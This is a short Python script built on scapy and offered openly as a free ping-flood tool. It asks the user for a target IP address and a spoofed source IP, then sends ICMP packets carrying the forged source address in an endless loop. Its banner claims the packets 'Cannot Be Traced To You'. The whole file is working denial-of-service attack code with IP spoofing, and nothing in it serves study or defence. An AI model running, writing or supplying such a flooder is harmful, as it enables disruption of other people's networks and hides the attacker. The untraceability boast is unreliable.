from scapy.all import *
print( 
"""

          `:::::////:::-`          
       -//:............-//:.       
     :+:....-:.......-:....:/-     
   -+-.....:NMo...../NM+.....:+`   
  :/.......sMMm.....hMMd.......+-  
 -/........yMMN.....dMMm........o. 
 o.........oMMh.....oMMy........-s 
.+.........-sy-.....-sy-.........o`
-/../os:.................../ss:..+.
`+..:sy.....................d+-..o 
 o-..-m/...................+m-..-+ 
 `o...:d+.................od-...+  
  .o-..-oh+-...........-oho-..-+`  
   `+:...-+yyso+///+osss/....//    
     -//.....-:/++//-.....-//.     
       `://:..........-:/::`       
           .::::::::::-```               
                                                            
   "Dont worry, Be Happy" - Omni
These Packets Cannot Be Traced To You
""")
destination = input(str("Enter IP To Ping Flood: "))
print(" ")
print("IP To Flood Set To",destination)
print(" ")
sourcedd = input(str("Enter Spoof IP (CAN BE ANY IP): "))
print(" ")
print("Flooding",destination,"With Pings From",sourcedd)
print(" ")
print("To Show Your Support For This Free Software Say Thanks To Omni Phantom")
while True:
    send(IP(src=sourcedd, dst=destination)/ICMP(),verbose = 0)